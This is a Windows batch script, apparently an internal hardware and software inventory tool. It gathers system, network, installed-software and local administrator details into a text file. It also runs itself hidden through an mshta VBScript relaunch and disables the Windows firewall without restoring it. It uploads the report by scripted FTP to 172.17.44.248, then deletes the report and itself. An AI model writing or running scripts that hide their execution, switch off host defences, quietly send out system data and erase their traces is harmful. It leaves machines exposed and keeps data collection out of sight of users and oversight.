@echo off
%1 mshta vbscript:createobject("wscript.shell").run("""%~0"" :",0)(window.close)&&exit
setlocal  ENABLEDELAYEDEXPANSION

del /f "%TEMP%\temp.txt" 
dxdiag /t %TEMP%\temp.txt
del /f "C:\%COMPUTERNAME%.txt" 
echo CurrentTime=%date:~0,10% %time:~0,8%>C:\%COMPUTERNAME%.txt
echo FileShare Information:>>C:\%COMPUTERNAME%.txt
for /f "skip=1 tokens=*" %%a in ('wmic share get name^,path ') do (
   echo.      %%a>>C:\%COMPUTERNAME%.txt
)
echo.>>C:\%COMPUTERNAME%.txt
echo RAM:>>C:\%COMPUTERNAME%.txt
for /f "tokens=*" %%a in ('wmic path Win32_MemoryDevice get EndingAddress /value ^|findstr /i "EndingAddress" ') do (
   echo.      %%a>>C:\%COMPUTERNAME%.txt
)
for /f "tokens=*" %%r in ('wmic MEMLOGICAL get TotalPhysicalMemory  /value ^|findstr /i "TotalPhysicalMemory" ') do (
		echo.      %%r>>C:\%COMPUTERNAME%.txt
) 

echo System Information: >>C:\%COMPUTERNAME%.txt 
echo       Computer Name = %COMPUTERNAME% >>C:\%COMPUTERNAME%.txt

:system
if EXIST "%TEMP%\temp.txt" (
    for /f "tokens=1,2,* delims=:" %%a in ('findstr /c:" Machine name:" /c:" Operating System:" /c:" System Model:" /c:" Processor:"  "%TEMP%\temp.txt"') do (
         set /a tee+=1
	rem if !tee! == 1 echo       Computer Name =%%b>>C:\%COMPUTERNAME%.txt
	 if !tee! == 2 echo       OS       Type =%%b>>C:\%COMPUTERNAME%.txt
	 if !tee! == 3 echo       System  Model =%%b>>C:\%COMPUTERNAME%.txt
         if !tee! == 4 echo       CPU     Model =%%b>>C:\%COMPUTERNAME%.txt	 
)   ) else (
    ping /n 2 127.1>nul
    goto system
)

echo.>>C:\%COMPUTERNAME%.txt
echo DisplayCard:>>C:\%COMPUTERNAME%.txt
for /f "tokens=*" %%a in ('wmic path Win32_VideoController get Caption /value ^| findstr /i "Caption" ') do (
   set base=%%a
	echo        !base!>>C:\%COMPUTERNAME%.txt
)


echo.>>C:\%COMPUTERNAME%.txt
echo Mother Board:>>C:\%COMPUTERNAME%.txt
for /f "tokens=*" %%a in ('wmic BASEBOARD get Manufacturer ^,Product /value ^| findstr /i "Manufacturer Product" ') do (
   set base=%%a
	echo        !base!>>C:\%COMPUTERNAME%.txt
)


echo.>>C:\%COMPUTERNAME%.txt
echo Hard Disk:>>C:\%COMPUTERNAME%.txt 
for /f "tokens=*" %%a in ('wmic DISKDRIVE get Model ^,Size /value ^|findstr /i "Model Size" ') do (
   echo.      %%a>>C:\%COMPUTERNAME%.txt
)

echo Network Card:>>C:\%COMPUTERNAME%.txt
ipconfig /all |find /i "Description" 
if %errorlevel%==1 goto 7
for /f "tokens=2* delims==:" %%a in ('ipconfig/all^|find /i "Description" ^| findstr /v "Microsoft" ^| findstr /v "Tunneling" ^| findstr /v "VPN" ^| findstr /v "RAS" ') do (
   set  name=%%a 
   echo      NetCard Model =%%a>>C:\%COMPUTERNAME%.txt
)
for /f "tokens=2* delims==:" %%a in ('ipconfig/all^|find /i "Physical Address" ^| findstr /v "00-00-00-00"') do (
    set  name=%%a
    echo      MAC Address =%%a>>C:\%COMPUTERNAME%.txt
)
for /f "tokens=2* delims==:" %%a in ('ipconfig/all^|find /i "IP Address"') do (
    set  name=%%a
    echo      IP Address =%%a>>C:\%COMPUTERNAME%.txt
)
for /f "tokens=2* delims==:" %%a in ('ipconfig/all^|find /i "IPV4"') do (
    set  name=%%a
    echo      IP Address = %%a>>C:\%COMPUTERNAME%.txt
)
goto soft
:7
ipconfig /all |find /i "描述"
if %errorlevel%==1 goto other
for /f "tokens=2* delims==:" %%a in ('ipconfig/all^|find /i "描述" ^| findstr /v "Microsoft" ^| findstr /v "Tunneling" ^| findstr /v "VPN" ') do (
    set  name=%%a
    echo      NetCard Model =%%a>>C:\%COMPUTERNAME%.txt
)
for /f "tokens=2* delims==:" %%a in ('ipconfig/all^|find /i "物理地址" ^| findstr /v "00-00-00-00" ') do (
    set  name=%%a
    echo      MAC Address =%%a>>C:\%COMPUTERNAME%.txt
)
for /f "tokens=2* delims==:" %%a in ('ipconfig/all^|find /i "IPV4"') do (
    set  name=%%a
    echo      IP Address = %%a>>C:\%COMPUTERNAME%.txt
)
goto soft
:other
for /f "tokens=*" %%a in ('wmic nicconfig get caption ^,macaddress ^|findstr /i "AMD Realtek Marvell SiS D-link AcerLAN VIA Intel Atheros pci pcie 3Com Broadcom" ') do (
   echo.      %%a>>C:\%COMPUTERNAME%.txt
)
for /f "tokens=*" %%a in ('wmic nicconfig get ipaddress ^|findstr "{" ') do (
   echo.      %%a>>C:\%COMPUTERNAME%.txt
)
:soft
ver|find /i "windows xp" &&goto xp||goto win7
:xp
echo.>>C:\%COMPUTERNAME%.txt
echo Software Information:>>C:\%COMPUTERNAME%.txt
for /f "tokens=7 delims=\" %%i in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" ^| findstr /v "KB" 2^>nul') do (
 for /f "skip=4 tokens=2*" %%a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\%%i" /v DisplayName 2^>nul' ) do (
	echo %%b>>C:\%COMPUTERNAME%.txt
  )
)
for /f "tokens=2 delims=\" %%x in ('reg query HKU') do (
  for /f "tokens=8 delims=\" %%a in ('reg query "HKU\%%x\Software\Microsoft\Windows\CurrentVersion\Uninstall" 2^>nul') do (
     for /f "skip=4 tokens=2*" %%i in ('reg query "HKU\%%x\Software\Microsoft\Windows\CurrentVersion\Uninstall\%%a"  /v "DisplayName" 2^>nul') do (
      echo %%j>>C:\%COMPUTERNAME%.txt
     )
  )
)
if exist %windir%\system32\CCM\CcmExec.exe echo "SMS Client has been installed,please uninstall">>C:\%COMPUTERNAME%.txt


echo.>>C:\%COMPUTERNAME%.txt
echo USB Information:>>C:\%COMPUTERNAME%.txt
for /f "skip=4 tokens=2*" %%a in ('reg query "HKLM\SYSTEM\CurrentControlSet\Services\usbstor" /v "start" 2^>nul' ) do (
	if "%%b"=="0x4" echo 	USB is Close>>C:\%COMPUTERNAME%.txt
	if "%%b"=="0x3" echo 	USB is Open,Please Tag It.>>C:\%COMPUTERNAME%.txt
)
echo Language Code:>>C:\%COMPUTERNAME%.txt
for /f "skip=4 tokens=2*" %%a in ('reg query "HKLM\SYSTEM\ControlSet001\Control\Nls\Language" /v "Default" 2^>nul' ) do (
	if "%%b"=="0404" echo 	Language:big5>>C:\%COMPUTERNAME%.txt
	if "%%b"=="0804" echo 	Language:gbk>>C:\%COMPUTERNAME%.txt
)

goto last

:win7
echo.>>C:\%COMPUTERNAME%.txt
echo Software Information:>>C:\%COMPUTERNAME%.txt
for /f "tokens=7 delims=\" %%i in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" ^| findstr /v "KB" 2^>nul ') do (
    for /f "skip=2 tokens=3* delims= " %%a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\%%i" /v DisplayName 2^>nul') do (
		echo %%a %%b>>C:\%COMPUTERNAME%.txt
	)
)
for /f "tokens=8 delims=\" %%i in ('reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall" 2^>nul ^| findstr /v "KB" 2^>nul ') do (
    for /f "skip=2 tokens=3* delims= " %%a in ('reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\%%i" /v DisplayName 2^>nul') do (
		echo %%a %%b>>C:\%COMPUTERNAME%.txt
	)
)
for /f "tokens=2 delims=\" %%x in ('reg query HKU') do (
  for /f "tokens=8 delims=\" %%a in ('reg query "HKU\%%x\Software\Microsoft\Windows\CurrentVersion\Uninstall" 2^>nul') do (
     for /f "skip=2 tokens=2*" %%i in ('reg query "HKU\%%x\Software\Microsoft\Windows\CurrentVersion\Uninstall\%%a"  /v "DisplayName" 2^>nul') do (
      echo %%j>>C:\%COMPUTERNAME%.txt
     )
  )
)

for /f "tokens=2 delims=\" %%x in ('reg query HKU') do (
  for /f "tokens=9 delims=\" %%a in ('reg query "HKU\%%x\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall" 2^>nul') do (
     for /f "skip=2 tokens=2*" %%i in ('reg query "HKU\%%x\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\%%a"  /v "DisplayName" 2^>nul') do (
      echo %%j>>C:\%COMPUTERNAME%.txt
     )
  )
)

echo.>>C:\%COMPUTERNAME%.txt
echo USB Information:>>C:\%COMPUTERNAME%.txt
for /f "skip=2 tokens=2*" %%a in ('reg query "HKLM\SYSTEM\CurrentControlSet\Services\usbstor" /v "start" 2^>nul' ) do (
	if "%%b"=="0x4" echo 	USB is Close>>C:\%COMPUTERNAME%.txt
	if "%%b"=="0x3" echo 	USB is Open,Please Tag It.>>C:\%COMPUTERNAME%.txt
)
echo Language Code:>>C:\%COMPUTERNAME%.txt
for /f "skip=2 tokens=2*" %%a in ('reg query "HKLM\SYSTEM\ControlSet001\Control\Nls\Language" /v "Default" 2^>nul' ) do (
	if "%%b"=="0404" echo 	Language:big5>>C:\%COMPUTERNAME%.txt
	if "%%b"=="0804" echo 	Language:gbk>>C:\%COMPUTERNAME%.txt
)


:last
echo.>>C:\%COMPUTERNAME%.txt
echo Admin Users:>>C:\%COMPUTERNAME%.txt
for /f "skip=6 tokens=*" %%i in ('net localgroup Administrators ^| findstr /v "㏑" ^| findstr /v "命" ^| findstr /v "command"') do (
	echo       %%i>>C:\%COMPUTERNAME%.txt
)

echo Power Users:>>C:\%COMPUTERNAME%.txt
for /f "skip=6 tokens=*" %%i in ('net localgroup "Power Users" ^| findstr /v "㏑" ^| findstr /v "命" ^| findstr /v "command"') do (
	echo       %%i>>C:\%COMPUTERNAME%.txt
)
echo.>>C:\%COMPUTERNAME%.txt
echo Scan Over>>C:\%COMPUTERNAME%.txt

netsh firewall set opmode disable
echo open 172.17.44.248>C:\ftp.txt
echo asc>>C:\ftp.txt
echo asc>>C:\ftp.txt
echo bin>>C:\ftp.txt
echo prompt>>C:\ftp.txt
echo put C:\%COMPUTERNAME%.txt>>C:\ftp.txt
echo bye>>C:\ftp.txt
ftp -s:C:\ftp.txt
del /f C:\ftp.txt
del /f C:\%COMPUTERNAME%.txt
del /f %windir%\hardsoft-viewer.bat
del /f %0%
exit
